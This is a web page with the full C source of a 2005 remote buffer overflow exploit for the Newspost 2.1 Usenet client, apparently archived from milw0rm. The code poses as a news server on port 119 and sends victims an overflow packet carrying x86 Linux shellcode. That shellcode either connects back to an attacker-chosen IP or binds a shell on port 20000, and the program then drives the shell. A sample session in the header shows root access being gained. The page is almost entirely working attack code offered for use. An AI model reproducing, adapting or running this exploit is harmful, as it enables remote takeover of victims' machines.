<html><head><title>Newspost 2.1 socket_getline() Remote Buffer Overflow Exploit v2</title></head><pre>/*
 * v0.2
 * Newspost &quot;socket_getline()&quot; Buffer Overflow Exploit
 * Exploit
 * Bug discovered: 02/03/2005
 *
 * cybertronic[at]gmx[dot]net
 *
 * [ cybertronic @ newspost ] $ gcc -o newspost_expl newspost_expl.c
 * [ cybertronic @ newspost ] $ ./newspost_expl cyber tronic
 * Usage
 * -----
 * [ Bindshell    ] ./newspost_expl
 * [ Reverseshell ] ./newspost_expl [CONNECTBACK IP]
 * [ cybertronic @ newspost ] $ ./newspost_expl
 *
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ newspost-2.1 remote exploit
 * --[ enter retaddr [ 0 = default ]
 * &gt;&gt; 0
 * --[ listening...OK!
 * --[ Incomming connection from:   192.168.2.103
 * --[ using bind shellcode!
 * --[ retaddr: 0xbfffee01
 * --[ sending packet [ 1056 bytes ]...done!
 * --[ sleeping 5 seconds before connecting to 192.168.2.103:20000...
 * --[ connecting to 192.168.2.103:20000...done!
 * --[ b0x pwned - h4ve phun
 * id
 * uid=0(root) gid=0(root) groups=0(root)
 *
 */

#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define RED		&quot;\E[31m\E[1m&quot;
#define GREEN	&quot;\E[32m\E[1m&quot;
#define YELLOW	&quot;\E[33m\E[1m&quot;
#define BLUE	&quot;\E[34m\E[1m&quot;
#define NORMAL	&quot;\E[m&quot;

#define PORT	119

int isip ( char *ip );
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void exploit ( int s, char* ip, unsigned long lip, unsigned long ret, int option );
void header ();
void start_reverse_handler ( unsigned short cbport );
void wait ( int sec );

//131 bytes connect back 45295, greetz to esDee
char linux_connect_back[] =
&quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1&quot;
&quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
&quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot;
&quot;\x89\xc2\x31\xc0\x31\xc9\x51\x51&quot;
&quot;\x68\x41\x42\x43\x44\x66\x68\xb0&quot;
&quot;\xef\xb1\x02\x66\x51\x89\xe7\xb3&quot;
&quot;\x10\x53\x57\x52\x89\xe1\xb3\x03&quot;
&quot;\xb0\x66\xcd\x80\x31\xc9\x39\xc1&quot;
&quot;\x74\x06\x31\xc0\xb0\x01\xcd\x80&quot;
&quot;\x31\xc0\xb0\x3f\x89\xd3\xcd\x80&quot;
&quot;\x31\xc0\xb0\x3f\x89\xd3\xb1\x01&quot;
&quot;\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot;
&quot;\xb1\x02\xcd\x80\x31\xc0\x31\xd2&quot;
&quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
&quot;\x2f\x62\x69\x89\xe3\x50\x53\x89&quot;
&quot;\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0&quot;
&quot;\x01\xcd\x80&quot;;

//92 bytes bindcode port 20000
char scode[] =
&quot;\x31\xdb&quot;				// xor ebx, ebx
&quot;\xf7\xe3&quot;				// mul ebx
&quot;\xb0\x66&quot;				// mov al, 102
&quot;\x53&quot;					// push ebx
&quot;\x43&quot;					// inc ebx
&quot;\x53&quot;					// push ebx
&quot;\x43&quot;					// inc ebx
&quot;\x53&quot;					// push ebx
&quot;\x89\xe1&quot;				// mov ecx, esp
&quot;\x4b&quot;					// dec ebx
&quot;\xcd\x80&quot;				// int 80h
&quot;\x89\xc7&quot;				// mov edi, eax
&quot;\x52&quot;					// push edx
&quot;\x66\x68\x4e\x20&quot;		// push word 8270
&quot;\x43&quot;					// inc ebx
&quot;\x66\x53&quot;				// push bx
&quot;\x89\xe1&quot;				// mov ecx, esp
&quot;\xb0\xef&quot;				// mov al, 239
&quot;\xf6\xd0&quot;				// not al
&quot;\x50&quot;					// push eax
&quot;\x51&quot;					// push ecx
&quot;\x57&quot;					// push edi
&quot;\x89\xe1&quot;				// mov ecx, esp
&quot;\xb0\x66&quot;				// mov al, 102
&quot;\xcd\x80&quot;				// int 80h
&quot;\xb0\x66&quot;				// mov al, 102
&quot;\x43&quot;					// inc ebx
&quot;\x43&quot;					// inc ebx
&quot;\xcd\x80&quot;				// int 80h
&quot;\x50&quot;					// push eax
&quot;\x50&quot;					// push eax
&quot;\x57&quot;					// push edi
&quot;\x89\xe1&quot;				// mov ecx, esp
&quot;\x43&quot;					// inc ebx
&quot;\xb0\x66&quot;				// mov al, 102
&quot;\xcd\x80&quot;				// int 80h
&quot;\x89\xd9&quot;				// mov ecx, ebx
&quot;\x89\xc3&quot;				// mov ebx, eax
&quot;\xb0\x3f&quot;				// mov al, 63
&quot;\x49&quot;					// dec ecx
&quot;\xcd\x80&quot;				// int 80h
&quot;\x41&quot;					// inc ecx
&quot;\xe2\xf8&quot;				// loop lp
&quot;\x51&quot;					// push ecx
&quot;\x68\x6e\x2f\x73\x68&quot;	// push dword 68732f6eh
&quot;\x68\x2f\x2f\x62\x69&quot;	// push dword 69622f2fh
&quot;\x89\xe3&quot;				// mov ebx, esp
&quot;\x51&quot;					// push ecx
&quot;\x53&quot;					// push ebx
&quot;\x89\xe1&quot;				// mov ecx, esp
&quot;\xb0\xf4&quot;				// mov al, 244
&quot;\xf6\xd0&quot;				// not al
&quot;\xcd\x80&quot;;				// int 80h

int
isip ( char *ip )
{
	int a, b, c, d;
	
	if ( !sscanf ( ip, &quot;%d.%d.%d.%d&quot;, &amp;a, &amp;b, &amp;c, &amp;d ) )
		return ( 0 );
	if ( a &lt; 1 )
		return ( 0 );
	if ( a &gt; 255 )
		return 0;
	if ( b &lt; 0 )
		return 0;
	if ( b &gt; 255 )
		return 0;
	if ( c &lt; 0 )
		return 0;
	if ( c &gt; 255 )
		return 0;
	if ( d &lt; 0 )
		return 0;
	if ( d &gt; 255 )
		return 0;
	return 1;
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( &quot;--[&quot; YELLOW &quot; b&quot; NORMAL &quot;0&quot; YELLOW &quot;x &quot; NORMAL &quot;p&quot; YELLOW &quot;w&quot; NORMAL &quot;n&quot; YELLOW &quot;e&quot; NORMAL &quot;d &quot; YELLOW &quot;- &quot; NORMAL &quot;h&quot; YELLOW &quot;4&quot; NORMAL &quot;v&quot; YELLOW &quot;e &quot; NORMAL &quot;p&quot; YELLOW &quot;h&quot; NORMAL &quot;u&quot; YELLOW &quot;n&quot; NORMAL &quot;\n&quot; );

	FD_ZERO ( &amp;fd_read );
	FD_SET ( s, &amp;fd_read );
	FD_SET ( 0, &amp;fd_read );

	while ( 1 )
	{
		FD_SET ( s, &amp;fd_read );
		FD_SET ( 0, &amp;fd_read );

		if ( select ( s + 1, &amp;fd_read, NULL, NULL, NULL ) &lt; 0 )
			break;
		if ( FD_ISSET ( s, &amp;fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( write ( 1, buffer, n ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		if ( FD_ISSET ( 0, &amp;fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( send ( s, buffer, n, 0 ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, &quot;cannot resolve \&quot;%s\&quot;\n&quot;, tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
    {
		printf ( &quot;socket failed!\n&quot; );
		exit ( 1 );
	}
	printf ( &quot;--[ sleeping %d seconds before connecting to %s:%u...\n&quot;, sec, tip, bport );
	wait ( sec );
	printf ( &quot;--[ connecting to %s:%u...&quot;, tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED &quot;failed!\n&quot; NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW &quot;done!\n&quot; NORMAL);
	shell ( s, tip, bport );
}

void
exploit ( int s, char* ip, unsigned long lip, unsigned long ret, int option )
{
	char out[1200];

	bzero ( &amp;out, 1200 );
	memset ( out, 0x90, 1052 );
	printf ( &quot;--[ retaddr: 0x%08x\n&quot;, ret );
	strncat ( out, ( unsigned char* ) &amp;ret, 4 );

	if ( option == 0 )
	{
		memcpy ( &amp;linux_connect_back[33], &amp;lip, 4);
		memcpy ( out + 649, linux_connect_back, sizeof ( linux_connect_back ) - 1 );
	}
	else
		memcpy ( out + 649, scode, sizeof ( scode ) - 1 );

	printf ( &quot;--[ sending packet [ %u bytes ]...&quot;, strlen ( out ) );
	if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
	{
		printf ( RED &quot;FAILED!\n&quot; NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW &quot;done!\n&quot; NORMAL);
	close ( s );
}

void
header ()
{
	printf ( &quot;              __              __                   _           \n&quot; );
	printf ( &quot;  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n&quot; );
	printf ( &quot; / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n&quot; );
	printf ( &quot;/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n&quot; );
	printf ( &quot;\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n&quot; );
	printf ( &quot;    /____/                                                     \n\n&quot; );
	printf ( &quot;--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n&quot; );
}

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	bzero ( &amp;servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( &quot;--[ starting reverse handler [port: %u]...&quot;, cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( &quot;socket failed!\n&quot; );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( &quot;listen failed!\n&quot; );
		exit ( 1 );
	}
	printf ( YELLOW &quot;done!\n&quot; NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
	{
		printf ( &quot;accept failed!\n&quot; );
		exit ( 1 );
	}
	close ( s1 );
	printf ( &quot;--[ incomming connection from:\t&quot; YELLOW &quot; %s\n&quot; NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s1, s2;
	unsigned long lip;
	unsigned long ret = 0;
	char* ip;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;
	
	if ( argc != 1 )
		if ( argc != 2 )
		{
			fprintf ( stderr, &quot;Usage\n-----\n[ Bindshell    ] %s\n[ Reverseshell ] %s [CONNECTBACK IP]\n&quot;, argv[0], argv[0] );
			exit ( 1 );
		}
	system ( &quot;clear&quot; );
	header ();
	if ( argc == 2 )
	{
		if ( !isip ( argv[1] ) )
		{
			printf ( &quot;--[ Invalid connectback IP!\n&quot; );
			exit ( 1 );
		}
	}

	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
		exit ( 1 );
	
	bzero ( &amp;servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );
	
	bind ( s1, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
	printf ( &quot;--[ newspost-2.1 remote exploit\n&quot; );
	printf ( &quot;--[ enter retaddr [ 0 = default ]\n&quot; );
	printf ( &quot;&gt;&gt; &quot; );
	scanf ( &quot;%x&quot;, &amp;ret );
	if ( ret == 0 )
		ret = 0xbfffee01;
	printf ( &quot;--[ listening...&quot; );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( RED &quot;FAILED!\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( GREEN &quot;OK!\n&quot; NORMAL );
	
	clilen = sizeof ( cliaddr );
		
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
			exit ( 1 );
	close ( s1 );
	printf ( &quot;--[&quot; GREEN &quot; Incomming connection from:\t %s\n&quot; NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	if ( argc == 2 )
	{
		printf ( &quot;--[&quot; YELLOW &quot; using connect back shellcode!\n&quot; NORMAL );
		lip = inet_addr ( argv[1] );
		exploit ( s2, ( char* ) NULL, lip, ret, 0 );
		start_reverse_handler ( 45295 );
	}
	else
	{
		printf ( &quot;--[&quot; YELLOW &quot; using bind shellcode!\n&quot; NORMAL );
		ip = ( char* ) inet_ntoa ( cliaddr.sin_addr );
		exploit ( s2, ip, ( unsigned long ) NULL, ret, 1 );
		connect_to_bindshell ( ip, 20000 );
	}
}

// milw0rm.com [2005-02-03]</pre></html>